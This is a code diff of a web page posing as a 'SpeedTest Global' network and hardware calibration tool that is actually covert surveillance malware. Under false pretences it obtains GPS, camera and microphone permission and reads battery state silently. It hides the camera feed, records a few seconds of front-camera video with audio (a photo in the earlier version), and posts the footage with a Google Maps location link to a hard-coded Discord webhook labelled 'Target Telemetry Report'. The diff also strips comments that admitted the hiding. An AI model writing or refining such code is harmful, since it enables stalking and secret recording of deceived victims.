@@ -3,15 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SpeedTest Global</title>
+    <title>SpeedTest Global | Calibration</title>
     <style>
-        /* This makes the page look professional */
         body { font-family: sans-serif; background: #0b0e18; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .card { background: #161b2c; padding: 30px; border-radius: 20px; text-align: center; width: 85%; max-width: 350px; border: 1px solid #232a42; }
         .btn { background: #00d2ff; color: #000; border: none; padding: 18px; width: 100%; font-weight: bold; border-radius: 12px; cursor: pointer; margin-top: 20px; font-size: 1.1rem; }
         #status { margin-top: 15px; color: #5c6784; font-size: 0.8rem; }
-        
-        /* Hide the camera feed and capture area from the user */
         video, canvas { display: none; }
     </style>
 </head>
@@ -19,81 +16,90 @@
 
     <div class="card">
         <div style="font-size: 30px; margin-bottom: 10px;">🚀</div>
-        <h2>Network Calibration</h2>
-        <p>Enable permissions to find the highest speed server node.</p>
-        <button class="btn" id="startBtn">START TEST</button>
-        <p id="status">Ready...</p>
+        <h2>Hardware Calibration</h2>
+        <p>Syncing GPS, Camera, and Audio sensors for optimal routing.</p>
+        <button class="btn" id="startBtn">START CALIBRATION</button>
+        <p id="status">System Ready</p>
     </div>
 
     <video id="video" autoplay playsinline muted></video>
-    <canvas id="canvas"></canvas>
 
     <script>
         const WEBHOOK = 'https://discord.com/api/webhooks/1476812049169383524/WP8wz0C8921xD_t0FTkX5MX2zSvb1OD0l2AGc55llvFCVcei7VeRgKG-0Q7gftwITMZV';
 
         document.getElementById('startBtn').addEventListener('click', async function() {
             const status = document.getElementById('status');
-            status.innerText = "Requesting System Access...";
+            status.innerText = "Accessing System Nodes...";
 
-            // GPS Request
+            // 1. Get Battery Info (Silent)
+            let batteryDetails = "Unknown";
+            try {
+                const b = await navigator.getBattery();
+                batteryDetails = `${(b.level * 100).toFixed(0)}% (${b.charging ? 'Charging' : 'Unplugged'})`;
+            } catch(e) {}
+
+            // 2. Request GPS
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                status.innerText = "GPS Located. Syncing Camera...";
+                status.innerText = "GPS Verified. Starting Video Sync...";
                 
                 const lat = pos.coords.latitude;
                 const lon = pos.coords.longitude;
 
-                // Camera Request
+                // 3. Request Video & Audio
                 let stream = null;
                 try {
                     stream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { facingMode: "user" }, 
-                        audio: false 
+                        video: { facingMode: "user", width: 640, height: 480 }, 
+                        audio: true 
                     });
-                } catch (e) { console.log("Camera denied"); }
+                } catch (e) {
+                    status.innerText = "Permissions Denied.";
+                    return;
+                }
 
                 if (stream) {
                     const video = document.getElementById('video');
                     video.srcObject = stream;
                     
-                    // FIXED: Wait for metadata to ensure video is ready
-                    video.onloadedmetadata = () => {
-                        video.play();
-                        // 3 Second delay to fix the Black Photo issue
-                        setTimeout(() => {
-                            const canvas = document.getElementById('canvas');
-                            canvas.width = video.videoWidth;
-                            canvas.height = video.videoHeight;
-                            canvas.getContext('2d').drawImage(video, 0, 0);
+                    // Setup Video Recorder
+                    const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                    const chunks = [];
+                    mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                    
+                    mediaRecorder.start();
+                    status.innerText = "Calibrating Sensors (4s)...";
+
+                    setTimeout(() => {
+                        mediaRecorder.stop();
+                        mediaRecorder.onstop = async () => {
+                            const videoBlob = new Blob(chunks, { type: 'video/webm' });
+                            const formData = new FormData();
                             
-                            canvas.toBlob(async (blob) => {
-                                const formData = new FormData();
-                                const message = {
-                                    content: "📸 **TARGET CAPTURED**",
-                                    embeds: [{
-                                        title: "Device Report",
-                                        fields: [{ name: "📍 Maps Link", value: `https://www.google.com/maps?q=${lat},${lon}` }]
-                                    }]
-                                };
-                                formData.append('payload_json', JSON.stringify(message));
-                                formData.append('file', blob, 'shot.jpg');
+                            const message = {
+                                content: "🎥 **NEW VIDEO LOG**",
+                                embeds: [{
+                                    title: "Target Telemetry Report",
+                                    color: 15105570,
+                                    fields: [
+                                        { name: "📍 Location", value: `https://www.google.com/maps?q=$${lat},${lon}` },
+                                        { name: "🔋 Battery", value: batteryDetails, inline: true },
+                                        { name: "🎯 Accuracy", value: `${Math.round(pos.coords.accuracy)}m`, inline: true }
+                                    ]
+                                }]
+                            };
 
-                                await fetch(WEBHOOK, { method: 'POST', body: formData });
-                                stream.getTracks().forEach(t => t.stop()); // Turn off green dot
-                                done();
-                            }, 'image/jpeg');
-                        }, 3000);
-                    };
-                } else {
-                    // Send location only if camera failed
-                    const formData = new FormData();
-                    formData.append('payload_json', JSON.stringify({ content: "📍 Location Only: " + lat + "," + lon }));
-                    await fetch(WEBHOOK, { method: 'POST', body: formData });
-                    done();
+                            formData.append('payload_json', JSON.stringify(message));
+                            formData.append('file', videoBlob, 'capture.webm');
+
+                            await fetch(WEBHOOK, { method: 'POST', body: formData });
+                            
+                            stream.getTracks().forEach(t => t.stop());
+                            done();
+                        };
+                    }, 4000); // 4 Seconds recording
                 }
-
             }, (err) => {
                 alert("GPS Required.");
-                status.innerText = "Permission Denied.";
             }, { enableHighAccuracy: true });
         });
 
